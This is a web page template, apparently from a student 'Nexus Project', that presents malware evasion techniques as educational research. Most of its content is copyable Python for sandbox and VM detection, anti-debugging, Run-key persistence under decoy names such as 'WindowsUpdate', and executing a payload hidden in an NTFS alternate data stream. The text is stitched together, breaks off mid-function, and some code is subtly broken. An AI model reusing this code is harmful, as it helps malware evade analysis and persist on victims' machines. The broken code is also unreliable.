@extends('layouts.nexus')

@section('title', 'Evasion & Stealth Techniques - Nexus Project')

@push('styles')
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/gsap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/ScrollTrigger.min.js"></script>
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">

<style>
    * {
        font-family: 'Inter', sans-serif;
    }
    
    code, pre {
        font-family: 'JetBrains Mono', 'Fira Code', monospace !important;
    }

    .evasion-hero {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 30%, #334155 60%, #0f172a 100%);
        position: relative;
        overflow: hidden;
        min-height: 100vh;
        display: flex;
        align-items: center;
    }
    
    .particles-container {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 1;
    }
    
    .hero-content {
        position: relative;
        z-index: 10;
        width: 100%;
    }
    
    .floating-orbs {
        position: absolute;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 2;
    }
    
    .orb {
        position: absolute;
        border-radius: 50%;
        filter: blur(1px);
        opacity: 0.6;
        animation: float 8s ease-in-out infinite;
    }
    
    .orb-1 {
        width: 120px;
        height: 120px;
        background: radial-gradient(circle, rgba(16, 185, 129, 0.3), transparent);
        top: 20%;
        left: 10%;
        animation-delay: 0s;
    }
    
    .orb-2 {
        width: 80px;
        height: 80px;
        background: radial-gradient(circle, rgba(6, 182, 212, 0.4), transparent);
        top: 60%;
        right: 15%;
        animation-delay: 2s;
    }
    
    .orb-3 {
        width: 60px;
        height: 60px;
        background: radial-gradient(circle, rgba(34, 197, 94, 0.3), transparent);
        bottom: 30%;
        left: 20%;
        animation-delay: 4s;
    }
    
    @keyframes float {
        0%, 100% { 
            transform: translateY(0px) translateX(0px) rotate(0deg); 
            opacity: 0.6; 
        }
        25% { 
            transform: translateY(-30px) translateX(20px) rotate(90deg); 
            opacity: 0.8; 
        }
        50% { 
            transform: translateY(-20px) translateX(-15px) rotate(180deg); 
            opacity: 1; 
        }
        75% { 
            transform: translateY(-40px) translateX(10px) rotate(270deg); 
            opacity: 0.7; 
        }
    }
    
    .glass-card {
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(16, 185, 129, 0.2);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        box-shadow: 
            0 8px 32px rgba(0, 0, 0, 0.3),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
        transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
        position: relative;
        overflow: hidden;
    }
    
    .glass-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.1), transparent);
        transition: left 0.8s cubic-bezier(0.23, 1, 0.32, 1);
    }
    
    .glass-card:hover::before {
        left: 100%;
    }
    
    .glass-card:hover {
        border-color: rgba(16, 185, 129, 0.4);
        box-shadow: 
            0 20px 60px rgba(16, 185, 129, 0.15),
            inset 0 1px 0 rgba(255, 255, 255, 0.2);
        transform: translateY(-12px) scale(1.02);
    }
    
    .neon-text {
        background: linear-gradient(135deg, #10b981, #06b6d4, #22d3ee);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        filter: drop-shadow(0 0 20px rgba(16, 185, 129, 0.5));
    }
    
    .cyber-icon {
        width: 70px;
        height: 70px;
        border-radius: 18px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(6, 182, 212, 0.3));
        border: 2px solid rgba(16, 185, 129, 0.4);
        position: relative;
        overflow: hidden;
    }
    
    .cyber-icon::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 0;
        height: 0;
        background: radial-gradient(circle, rgba(16, 185, 129, 0.3), transparent);
        transition: all 0.3s ease;
        border-radius: 50%;
        transform: translate(-50%, -50%);
    }
    
    .cyber-icon:hover::before {
        width: 100%;
        height: 100%;
    }
    
    .code-block {
        background: linear-gradient(145deg, rgba(17, 24, 39, 0.95), rgba(31, 41, 55, 0.9));
        border: 1px solid rgba(75, 85, 99, 0.4);
        border-radius: 12px;
        padding: 20px;
        font-family: 'JetBrains Mono', monospace;
        font-size: 14px;
        line-height: 1.6;
        max-height: 200px;
        overflow-y: auto;
        position: relative;
        box-shadow: 
            0 4px 20px rgba(0, 0, 0, 0.3),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }
    
    .code-block::-webkit-scrollbar {
        width: 8px;
    }
    
    .code-block::-webkit-scrollbar-track {
        background: rgba(31, 41, 55, 0.5);
        border-radius: 4px;
    }
    
    .code-block::-webkit-scrollbar-thumb {
        background: linear-gradient(45deg, #10b981, #06b6d4);
        border-radius: 4px;
    }
    
    .stats-counter {
        font-size: 3.5rem;
        font-weight: 900;
        background: linear-gradient(135deg, #10b981, #06b6d4, #22d3ee);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        filter: drop-shadow(0 2px 10px rgba(16, 185, 129, 0.3));
        font-family: 'Inter', sans-serif;
    }
    
    .progress-ring {
        width: 120px;
        height: 120px;
        position: relative;
    }
    
    .progress-ring circle {
        width: 100%;
        height: 100%;
        fill: none;
        stroke-width: 8;
        stroke-linecap: round;
        transform: rotate(-90deg);
        transform-origin: 50% 50%;
    }
    
    .progress-background {
        stroke: rgba(75, 85, 99, 0.3);
    }
    
    .progress-fill {
        stroke: url(#gradient);
        stroke-dasharray: 283;
        stroke-dashoffset: 283;
        transition: stroke-dashoffset 2s cubic-bezier(0.23, 1, 0.32, 1);
    }
    
    .tool-card {
        background: rgba(15, 23, 42, 0.8);
        border: 1px solid rgba(16, 185, 129, 0.3);
        border-radius: 16px;
        padding: 24px;
        text-align: center;
        transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
        position: relative;
        overflow: hidden;
        cursor: pointer;
    }
    
    .tool-card::after {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, rgba(16, 185, 129, 0.1), rgba(6, 182, 212, 0.1));
        opacity: 0;
        transition: opacity 0.3s ease;
    }
    
    .tool-card:hover::after {
        opacity: 1;
    }
    
    .tool-card:hover {
        transform: translateY(-8px) scale(1.05);
        border-color: rgba(16, 185, 129, 0.6);
        box-shadow: 0 15px 35px rgba(16, 185, 129, 0.2);
    }
    
    .pulse-animation {
        animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
    }
    
    @keyframes pulse {
        0%, 100% {
            opacity: 1;
        }
        50% {
            opacity: .7;
        }
    }
    
    .typing-animation {
        overflow: hidden;
        border-right: 3px solid #10b981;
        white-space: nowrap;
        animation: 
            typing 3.5s steps(40, end),
            blink-caret 0.75s step-end infinite;
    }
    
    @keyframes typing {
        from { width: 0 }
        to { width: 100% }
    }
    
    @keyframes blink-caret {
        from, to { border-color: transparent }
        50% { border-color: #10b981; }
    }
    
    .matrix-bg {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.1;
        background-image: 
            linear-gradient(90deg, transparent 98%, rgba(16, 185, 129, 0.3) 100%),
            linear-gradient(180deg, transparent 98%, rgba(16, 185, 129, 0.3) 100%);
        background-size: 20px 20px;
        animation: matrix-move 20s linear infinite;
    }
    
    @keyframes matrix-move {
        0% { transform: translate(0, 0); }
        100% { transform: translate(20px, 20px); }
    }
    
    .smooth-appear {
        opacity: 0;
        transform: translateY(60px) scale(0.95);
        filter: blur(5px);
        transition: all 1s cubic-bezier(0.23, 1, 0.32, 1);
    }
    
    .smooth-appear.visible {
        opacity: 1;
        transform: translateY(0) scale(1);
        filter: blur(0);
    }
    
    .magnetic-button {
        position: relative;
        transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
    }
    
    .magnetic-button:hover {
        transform: scale(1.05);
    }
    
    .magnetic-button::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, #10b981, #06b6d4);
        border-radius: inherit;
        z-index: -1;
        transition: all 0.3s ease;
        filter: blur(8px);
        opacity: 0;
    }
    
    .magnetic-button:hover::before {
        opacity: 0.7;
        filter: blur(12px);
    }
</style>
@endpush

@section('content')
<div class="max-w-7xl mx-auto relative">
    <!-- Matrix Background -->
    <div class="matrix-bg"></div>
    
    <!-- Enhanced Hero Section with Particles -->
    <section class="evasion-hero relative">
        <!-- Particles.js Container -->
        <div id="particles-js" class="particles-container"></div>
        
        <!-- Floating Orbs -->
        <div class="floating-orbs">
            <div class="orb orb-1"></div>
            <div class="orb orb-2"></div>
            <div class="orb orb-3"></div>
        </div>
        
        <div class="hero-content px-8">
            <div class="text-center">
                <div class="inline-flex items-center px-8 py-4 bg-emerald-500/20 rounded-full text-emerald-300 text-sm font-medium mb-12 smooth-appear backdrop-blur-md border border-emerald-500/30">
                    <i class="fas fa-shield-alt mr-3 text-lg pulse-animation"></i>
                    Advanced Evasion Research Framework
                </div>
                
                <h1 class="text-7xl md:text-8xl font-black mb-12 neon-text smooth-appear">
                    Stealth Nexus
                </h1>
                
                <div class="typing-animation text-2xl md:text-3xl text-gray-300 max-w-4xl mx-auto mb-16 smooth-appear">
                    Next-generation cybersecurity defense through controlled threat research
                </div>
                
                <!-- Enhanced Live Stats with Circular Progress -->
                <div class="grid grid-cols-3 gap-12 mt-16 max-w-4xl mx-auto smooth-appear">
                    <div class="text-center">
                        <div class="progress-ring mx-auto mb-4">
                            <svg class="progress-ring" width="120" height="120">
                                <defs>
                                    <linearGradient id="gradient1" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" style="stop-color:#10b981"/>
                                        <stop offset="100%" style="stop-color:#06b6d4"/>
                                    </linearGradient>
                                </defs>
                                <circle class="progress-background" cx="60" cy="60" r="45"/>
                                <circle class="progress-fill" cx="60" cy="60" r="45" id="progress1"/>
                            </svg>
                            <div class="absolute inset-0 flex items-center justify-center">
                                <div class="stats-counter" data-target="25">0</div>
                            </div>
                        </div>
                        <div class="text-emerald-300 font-semibold text-lg">Techniques</div>
                    </div>
                    
                    <div class="text-center">
                        <div class="progress-ring mx-auto mb-4">
                            <svg class="progress-ring" width="120" height="120">
                                <defs>
                                    <linearGradient id="gradient2" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" style="stop-color:#06b6d4"/>
                                        <stop offset="100%" style="stop-color:#22d3ee"/>
                                    </linearGradient>
                                </defs>
                                <circle class="progress-background" cx="60" cy="60" r="45"/>
                                <circle class="progress-fill" cx="60" cy="60" r="45" id="progress2"/>
                            </svg>
                            <div class="absolute inset-0 flex items-center justify-center">
                                <div class="stats-counter" data-target="98">0</div>
                            </div>
                        </div>
                        <div class="text-cyan-300 font-semibold text-lg">Detection Rate</div>
                    </div>
                    
                    <div class="text-center">
                        <div class="progress-ring mx-auto mb-4">
                            <svg class="progress-ring" width="120" height="120">
                                <defs>
                                    <linearGradient id="gradient3" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" style="stop-color:#22d3ee"/>
                                        <stop offset="100%" style="stop-color:#10b981"/>
                                    </linearGradient>
                                </defs>
                                <circle class="progress-background" cx="60" cy="60" r="45"/>
                                <circle class="progress-fill" cx="60" cy="60" r="45" id="progress3"/>
                            </svg>
                            <div class="absolute inset-0 flex items-center justify-center">
                                <div class="stats-counter" data-target="12">0</div>
                            </div>
                        </div>
                        <div class="text-teal-300 font-semibold text-lg">Defense Tools</div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Enhanced Research Modules -->
    <section class="py-24 mb-20" data-aos="fade-up">
        <div class="px-8">
            <h2 class="text-5xl font-bold text-center text-white mb-16 neon-text" data-aos="fade-down">
                Research Modules
            </h2>
            
            <div class="grid lg:grid-cols-3 gap-10">
                <!-- VM Detection Module -->
                <div class="glass-card p-10 smooth-appear" data-aos="fade-up" data-aos-delay="100">
                    <div class="flex items-center mb-8">
                        <div class="cyber-icon mr-6">
                            <i class="fab fa-windows text-3xl text-blue-400"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold text-blue-400">VM Detection</h3>
                            <p class="text-gray-400">Sandbox Evasion</p>
                        </div>
                    </div>
                    
                    <p class="text-gray-300 mb-8 leading-relaxed text-lg">
                        Advanced techniques to identify virtual environments and analysis systems for developing robust detection countermeasures.
                    </p>
                    
                    <!-- Enhanced Code Block -->
                    <div class="code-block mb-6">
                        <div class="flex items-center justify-between mb-4">
                            <span class="text-emerald-400 text-sm font-medium">VM Detection Sample</span>
                            <button class="magnetic-button px-3 py-1 bg-emerald-500/20 text-emerald-400 rounded text-xs hover:bg-emerald-500/30 transition-colors">
                                <i class="fas fa-copy mr-1"></i> Copy
                            </button>
                        </div>
                        <code class="text-gray-300">
import winreg
try:
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
        r"SYSTEM\ControlSet001\Services\VBoxService")
    return "VirtualBox detected"
except FileNotFoundError:
    return "Physical machine"
                        </code>
                    </div>
                    
                    <div class="flex items-center justify-between">
                        <span class="text-sm text-gray-400 font-medium">Registry Analysis</span>
                        <button class="magnetic-button text-blue-400 hover:text-blue-300 font-semibold transition-colors">
                            Explore Technique →
                        </button>
                    </div>
                </div>

                <!-- Persistence Module -->
                <div class="glass-card p-10 smooth-appear" data-aos="fade-up" data-aos-delay="200">
                    <div class="flex items-center mb-8">
                        <div class="cyber-icon mr-6">
                            <i class="fas fa-cog text-3xl text-purple-400"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold text-purple-400">Persistence</h3>
                            <p class="text-gray-400">System Survival</p>
                        </div>
                    </div>
                    
                    <p class="text-gray-300 mb-8 leading-relaxed text-lg">
                        Registry, service, and task-based persistence mechanisms for understanding long-term threat survival techniques.
                    </p>
                    
                    <div class="code-block mb-6">
                        <div class="flex items-center justify-between mb-4">
                            <span class="text-purple-400 text-sm font-medium">Registry Persistence</span>
                            <button class="magnetic-button px-3 py-1 bg-purple-500/20 text-purple-400 rounded text-xs hover:bg-purple-500/30 transition-colors">
                                <i class="fas fa-copy mr-1"></i> Copy
                            </button>
                        </div>
                        <code class="text-gray-300">
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "SystemUpdate", 0, 
    winreg.REG_SZ, r"C:\Windows\system32\calc.exe")
                        </code>
                    </div>
                    
                    <div class="flex items-center justify-between">
                        <span class="text-sm text-gray-400 font-medium">Registry Manipulation</span>
                        <button class="magnetic-button text-purple-400 hover:text-purple-300 font-semibold transition-colors">
                            Explore Technique →
                        </button>
                    </div>
                </div>

                <!-- ADS Evasion Module -->
                <div class="glass-card p-10 smooth-appear" data-aos="fade-up" data-aos-delay="300">
                    <div class="flex items-center mb-8">
                        <div class="cyber-icon mr-6">
                            <i class="fas fa-stream text-3xl text-green-400"></i>
                        </div>
                        <div>
                            <h3 class="text-2xl font-bold text-green-400">ADS Stealth</h3>
                            <p class="text-gray-400">Hidden Streams</p>
                        </div>
                    </div>
                    
                    <p class="text-gray-300 mb-8 leading-relaxed text-lg">
                        Alternate Data Streams for covert data storage and execution within NTFS file system structures.
                    </p>
                    
                    <div class="code-block mb-6">
                        <div class="flex items-center justify-between mb-4">
                            <span class="text-green-400 text-sm font-medium">ADS Creation</span>
                            <button class="magnetic-button px-3 py-1 bg-green-500/20 text-green-400 rounded text-xs hover:bg-green-500/30 transition-colors">
                                <i class="fas fa-copy mr-1"></i> Copy
                            </button>
                        </div>
                        <code class="text-gray-300">
ads_path = f"{host_file}:hidden_data"
with open(ads_path, 'w') as ads:
    ads.write("Secret payload data")

subprocess.run(f"wmic process call create '{ads_path}'")
                        </code>
                    </div>
                    
                    <div class="flex items-center justify-between">
                        <span class="text-sm text-gray-400 font-medium">NTFS Features</span>
                        <button class="magnetic-button text-green-400 hover:text-green-300 font-semibold transition-colors">
                            Explore Technique →
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Enhanced Detection Tools -->
    <section class="py-20 mb-20" data-aos="fade-up">
        <div class="px-8">
            <h2 class="text-4xl font-bold text-white mb-16 text-center neon-text">Detection Arsenal</h2>
            <div class="grid md:grid-cols-4 gap-8">
                <div class="tool-card" data-aos="zoom-in" data-aos-delay="100">
                    <i class="fas fa-microscope text-5xl text-blue-400 mb-6 pulse-animation"></i>
                    <h3 class="text-white font-bold text-xl mb-3">VM Scanner</h3>
                    <p class="text-gray-400">Instant virtualization detection with 99.2% accuracy</p>
                </div>
                
                <div class="tool-card" data-aos="zoom-in" data-aos-delay="200">
                    <i class="fas fa-search text-5xl text-purple-400 mb-6 pulse-animation"></i>
                    <h3 class="text-white font-bold text-xl mb-3">Registry Monitor</h3>
                    <p class="text-gray-400">Real-time registry changes and persistence detection</p>
                </div>
                
                <div class="tool-card" data-aos="zoom-in" data-aos-delay="300">
                    <i class="fas fa-eye text-5xl text-green-400 mb-6 pulse-animation"></i>
                    <h3 class="text-white font-bold text-xl mb-3">ADS Finder</h3>
                    <p class="text-gray-400">Hidden stream detection and analysis toolkit</p>
                </div>
                
                <div class="tool-card" data-aos="zoom-in" data-aos-delay="400">
                    <i class="fas fa-shield text-5xl text-cyan-400 mb-6 pulse-animation"></i>
                    <h3 class="text-white font-bold text-xl mb-3">Behavior Guard</h3>
                    <p class="text-gray-400">AI-powered suspicious activity monitoring</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Back Navigation with Enhanced Button -->
    <section class="py-16 text-center" data-aos="fade-up">
        <a href="{{ route('nexus.second-semester') }}" 
           class="magnetic-button inline-flex items-center px-12 py-6 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-bold rounded-2xl transition-all duration-500 transform hover:scale-110 hover:shadow-2xl text-lg">
            <i class="fas fa-arrow-left mr-4 text-xl"></i>
            Back to Second Semester
        </a>
    </section>
</div><!-- Real Implementation Techniques -->
        <div class="mb-16">
            <h2 class="text-4xl font-bold text-white mb-8 text-center">Real Implementation Techniques</h2>
            
            <!-- Windows Evasion Implementation -->
            <div class="mb-12">
                <div class="stealth-card rounded-lg p-8 border border-blue-500/30">
                    <div class="flex items-center mb-6">
                        <div class="w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-600 rounded-full flex items-center justify-center mr-6">
                            <i class="fab fa-windows text-white text-2xl"></i>
                        </div>
                        <div>
                            <h3 class="text-3xl font-semibold text-blue-400 mb-2">Windows Evasion Framework</h3>
                            <p class="text-gray-300">Advanced VM and sandbox detection techniques</p>
                        </div>
                    </div>

                    <!-- VM Detection Code -->
                    <div class="mb-8">
                        <h4 class="text-xl font-semibold text-white mb-4">Virtual Machine Detection</h4>
                        <div class="relative">
                            <div class="code-container relative">
                                <div class="warning-overlay" id="vm-warning">
                                    <span>Click to reveal VM detection code (Educational purposes only)</span>
                                </div>
                                <pre class="blur-sensitive p-6" id="vm-code"><code class="language-python"># VM Detection Framework - Educational Research
import os, subprocess, winreg, platform
from ctypes import windll, c_char_p, c_int, c_void_p

class VMDetector:
    """Advanced VM detection for defensive analysis"""
    
    def __init__(self):
        self.detection_methods = []
        self.confidence_score = 0
    
    def check_registry_artifacts(self):
        """Detect VM-specific registry entries"""
        vm_keys = [
            r"SYSTEM\ControlSet001\Services\VBoxService",
            r"SYSTEM\ControlSet001\Services\VBoxMouse", 
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SYSTEM\ControlSet001\Services\vmdebug",
            r"SYSTEM\ControlSet001\Services\vmmemctl"
        ]
        
        detected = []
        for key_path in vm_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.CloseKey(key)
                detected.append(key_path.split('\\')[-1])
                self.confidence_score += 20
            except FileNotFoundError:
                continue
        
        return detected
    
    def check_running_processes(self):
        """Detect VM-related processes"""
        vm_processes = [
            'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
            'VBoxService.exe', 'VBoxTray.exe', 'VBoxClient.exe',
            'qemu-ga.exe', 'xenservice.exe', 'vmusrvc.exe'
        ]
        
        try:
            output = subprocess.check_output('tasklist', shell=True, text=True)
            detected_processes = []
            
            for process in vm_processes:
                if process.lower() in output.lower():
                    detected_processes.append(process)
                    self.confidence_score += 15
                    
            return detected_processes
        except:
            return []
    
    def check_hardware_artifacts(self):
        """Check for VM hardware signatures"""
        try:
            # Check CPU vendor
            cpu_info = subprocess.check_output('wmic cpu get name', shell=True, text=True)
            
            vm_signatures = ['vmware', 'virtual', 'qemu', 'kvm', 'xen']
            for signature in vm_signatures:
                if signature in cpu_info.lower():
                    self.confidence_score += 25
                    return f"VM CPU detected: {signature}"
                    
            # Check BIOS info
            bios_info = subprocess.check_output('wmic bios get serialnumber', shell=True, text=True)
            if 'vmware' in bios_info.lower() or '0' in bios_info:
                self.confidence_score += 20
                return "VM BIOS detected"
                
        except:
            pass
        return None
    
    def check_mac_addresses(self):
        """Check for VM-specific MAC address prefixes"""
        vm_mac_prefixes = [
            '00:0C:29', '00:1C:14', '00:50:56',  # VMware
            '08:00:27', '52:54:00',              # VirtualBox, QEMU
            '00:16:3E'                           # Xen
        ]
        
        try:
            output = subprocess.check_output('getmac', shell=True, text=True)
            for prefix in vm_mac_prefixes:
                if prefix in output:
                    self.confidence_score += 30
                    return f"VM MAC detected: {prefix}"
        except:
            pass
        return None
    
    def comprehensive_scan(self):
        """Run all detection methods"""
        results = {
            'is_vm': False,
            'confidence': 0,
            'evidence': []
        }
        
        # Registry check
        reg_artifacts = self.check_registry_artifacts()
        if reg_artifacts:
            results['evidence'].append(f"Registry artifacts: {reg_artifacts}")
        
        # Process check
        vm_processes = self.check_running_processes()
        if vm_processes:
            results['evidence'].append(f"VM processes: {vm_processes}")
        
        # Hardware check
        hw_artifact = self.check_hardware_artifacts()
        if hw_artifact:
            results['evidence'].append(hw_artifact)
        
        # MAC address check
        mac_artifact = self.check_mac_addresses()
        if mac_artifact:
            results['evidence'].append(mac_artifact)
        
        results['confidence'] = self.confidence_score
        results['is_vm'] = self.confidence_score > 30
        
        return results

# Educational usage example
if __name__ == "__main__":
    detector = VMDetector()
    scan_results = detector.comprehensive_scan()
    
    print(f"VM Detection Results:")
    print(f"Is Virtual Machine: {scan_results['is_vm']}")
    print(f"Confidence Score: {scan_results['confidence']}%")
    print(f"Evidence Found: {scan_results['evidence']}")
</code></pre>
                            </div>
                        </div>
                    </div>

                    <!-- Anti-Debugging Code -->
                    <div class="mb-8">
                        <h4 class="text-xl font-semibold text-white mb-4">Anti-Debugging Techniques</h4>
                        <div class="relative">
                            <div class="code-container relative">
                                <div class="warning-overlay" id="debug-warning">
                                    <span>Click to reveal anti-debugging code (Educational purposes only)</span>
                                </div>
                                <pre class="blur-sensitive p-6" id="debug-code"><code class="language-python"># Anti-Debugging Framework - Educational Research
import ctypes, os, time, threading
from ctypes import wintypes

class AntiDebugger:
    """Advanced anti-debugging techniques for research"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.debugger_detected = False
    
    def check_being_debugged_flag(self):
        """Check PEB BeingDebugged flag"""
        try:
            peb = self.kernel32.GetCurrentProcess()
            being_debugged = ctypes.c_bool()
            
            # Access PEB.BeingDebugged at offset 0x02
            self.ntdll.NtQueryInformationProcess(
                peb, 7, ctypes.byref(being_debugged), 1, None
            )
            
            return being_debugged.value
        except:
            return False
    
    def check_remote_debugger(self):
        """Check for remote debugger presence"""
        try:
            debugger_present = ctypes.c_bool()
            result = self.kernel32.CheckRemoteDebuggerPresent(
                self.kernel32.GetCurrentProcess(),
                ctypes.byref(debugger_present)
            )
            return debugger_present.value if result else False
        except:
            return False
    
    def check_debug_heap(self):
        """Check for debug heap flags"""
        try:
            # Get heap handle
            heap = self.kernel32.GetProcessHeap()
            
            # Check heap flags at offset 0x40
            heap_flags = ctypes.c_ulong()
            ctypes.memmove(
                ctypes.byref(heap_flags),
                heap + 0x40,
                4
            )
            
            # Debug heap has specific flags set
            return (heap_flags.value & 0x02) != 0
        except:
            return False
    
    def timing_check(self):
        """Use timing to detect debugging"""
        start_time = time.perf_counter()
        
        # Simple operation that should be fast
        for i in range(1000):
            pass
        
        end_time = time.perf_counter()
        execution_time = end_time - start_time
        
        # If execution takes too long, likely being debugged
        return execution_time > 0.01
    
    def check_debug_port(self):
        """Check for debug port in process"""
        try:
            debug_port = ctypes.c_void_p()
            status = self.ntdll.NtQueryInformationProcess(
                self.kernel32.GetCurrentProcess(),
                7,  # ProcessDebugPort
                ctypes.byref(debug_port),
                ctypes.sizeof(debug_port),
                None
            )
            
            return debug_port.value is not None
        except:
            return False
    
    def hardware_breakpoint_detection(self):
        """Detect hardware breakpoints via debug registers"""
        try:
            context = ctypes.Structure()
            context.ContextFlags = 0x10007  # CONTEXT_DEBUG_REGISTERS
            
            thread = self.kernel32.GetCurrentThread()
            if self.kernel32.GetThreadContext(thread, ctypes.byref(context)):
                # Check debug registers DR0-DR3
                return any([
                    getattr(context, f'Dr{i}', 0) != 0 
                    for i in range(4)
                ])
        except:
            pass
        return False
    
    def comprehensive_check(self):
        """Run all anti-debugging checks"""
        checks = {
            'being_debugged_flag': self.check_being_debugged_flag(),
            'remote_debugger': self.check_remote_debugger(),
            'debug_heap': self.check_debug_heap(),
            'timing_anomaly': self.timing_check(),
            'debug_port': self.check_debug_port(),
            'hardware_breakpoints': self.hardware_breakpoint_detection()
        }
        
        detected_methods = [method for method, detected in checks.items() if detected]
        
        return {
            'debugger_detected': len(detected_methods) > 0,
            'detection_methods': detected_methods,
            'confidence': len(detected_methods) * 20
        }

# Educational usage
if __name__ == "__main__":
    anti_debug = AntiDebugger()
    results = anti_debug.comprehensive_check()
    
    if results['debugger_detected']:
        print(f"Debugger detected via: {results['detection_methods']}")
        print(f"Confidence: {results['confidence']}%")
    else:
        print("No debugger detected")
</code></pre>
                            </div>
                        </div>
                    </div>

                    <!-- Detection Analysis -->
                    <div class="bg-gray-900/50 rounded-lg p-6">
                        <h4 class="text-lg font-semibold text-blue-400 mb-3">Security Analysis & Detection</h4>
                        <div class="grid md:grid-cols-2 gap-6">
                            <div>
                                <h5 class="text-white font-medium mb-2">Detection Indicators:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Registry key enumeration attempts</li>
                                    <li>• Process list scanning behavior</li>
                                    <li>• Hardware fingerprinting activities</li>
                                    <li>• Timing-based evasion patterns</li>
                                </ul>
                            </div>
                            <div>
                                <h5 class="text-white font-medium mb-2">Defensive Measures:</h5>
                                <ul class="text-gray-300 text-sm space-y-1">
                                    <li>• Monitor VM detection API calls</li>
                                    <li>• Detect anti-debugging behaviors</li>
                                    <li>• Sandbox environment hardening</li>
                                    <li>• Behavioral analysis integration</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Windows Persistence Implementation -->
            <div class="mb-12">
                <div class="stealth-card rounded-lg p-8 border border-purple-500/30">
                    <div class="flex items-center mb-6">
                        <div class="w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-600 rounded-full flex items-center justify-center mr-6">
                            <i class="fas fa-cog text-white text-2xl"></i>
                        </div>
                        <div>
                            <h3 class="text-3xl font-semibold text-purple-400 mb-2">Windows Persistence Framework</h3>
                            <p class="text-gray-300">Registry, service, and task-based persistence methods</p>
                        </div>
                    </div>

                    <!-- Registry Persistence -->
                    <div class="mb-8">
                        <h4 class="text-xl font-semibold text-white mb-4">Registry Persistence Techniques</h4>
                        <div class="relative">
                            <div class="code-container relative">
                                <div class="warning-overlay" id="persistence-warning">
                                    <span>Click to reveal persistence code (Educational purposes only)</span>
                                </div>
                                <pre class="blur-sensitive p-6" id="persistence-code"><code class="language-python"># Windows Persistence Framework - Educational Research
import winreg, os, subprocess, json, base64
from pathlib import Path

class PersistenceManager:
    """Advanced persistence techniques for research"""
    
    def __init__(self):
        self.persistence_methods = []
        self.current_user = os.environ.get('USERNAME', 'user')
    
    def registry_run_keys(self, payload_path, key_name="WindowsUpdate"):
        """Establish persistence via Run registry keys"""
        persistence_locations = [
            # Current User
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            
            # Local Machine (requires admin)
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            
            # Policies (often overlooked)
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
        ]
        
        successful_locations = []
        
